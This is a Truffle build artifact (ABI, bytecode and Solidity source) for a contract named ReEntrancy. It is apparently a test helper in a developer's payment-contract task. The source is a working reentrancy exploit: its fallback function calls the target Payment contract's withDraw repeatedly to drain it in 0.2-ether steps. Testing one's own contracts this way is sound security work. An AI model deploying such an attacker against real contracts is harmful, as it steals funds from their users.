{
  "contractName": "ReEntrancy",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_paymentContractAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516103b73803806103b7833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b6102a0806101176000396000f3fe6080604052600436106100225760003560e01c80639e5faafc1461010257610023565b5b6702c68af0bb14000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101005760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663845fb2116702c68af0bb14000060006040518363ffffffff1660e01b81526004016100cd929190610241565b600060405180830381600087803b1580156100e757600080fd5b505af11580156100fb573d6000803e3d6000fd5b505050505b005b34801561010e57600080fd5b50610117610119565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663845fb2116702c68af0bb14000060006040518363ffffffff1660e01b815260040161017d929190610241565b600060405180830381600087803b15801561019757600080fd5b505af11580156101ab573d6000803e3d6000fd5b50505050565b6000819050919050565b6000819050919050565b6000819050919050565b60006101ea6101e56101e0846101b1565b6101c5565b6101bb565b9050919050565b6101fa816101cf565b82525050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061022b82610200565b9050919050565b61023b81610220565b82525050565b600060408201905061025660008301856101f1565b6102636020830184610232565b939250505056fea26469706673582212206fd4f3eefe9ecbd9c16ade681b3045f8be8f1c77835e6cdd75f230f6d5907a6a64736f6c634300080a0033",
  "immutableReferences": {},
  "source": "pragma solidity 0.8.10;\n\n//  SPDX-License-Identifier: UNLICENSED\n\nimport \"../Payment.sol\";\n\n\ncontract ReEntrancy {\n\n    Payment _payment;\n\n\n    constructor(address _paymentContractAddress) {\n\n        _payment = Payment(_paymentContractAddress);\n    }\n\n    //  contract recieving ether should have a fallback or receive function but payable\n   \n   \n\n    fallback() external payable{\n\n        // attack implementation\n\n        if(address(_payment).balance >= 0.2 ether) {\n\n            _payment.withDraw(0.2 ether, address(0));\n           \n\n        }\n          \n    }\n\n    \n\n    function attack() external {\n        \n         _payment.withDraw(0.2 ether, address(0));        \n\n    }\n\n   \n \n}\n\n\n\n",
  "sourcePath": "/home/komolehin/Documents/blockchain/Liquality Task/contracts/utils/WithdrawReEntrancy.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.10+commit.fc410830.Emscripten.clang"
  },
  "schemaVersion": "3.4.6",
  "updatedAt": "2022-04-13T19:21:56.095Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}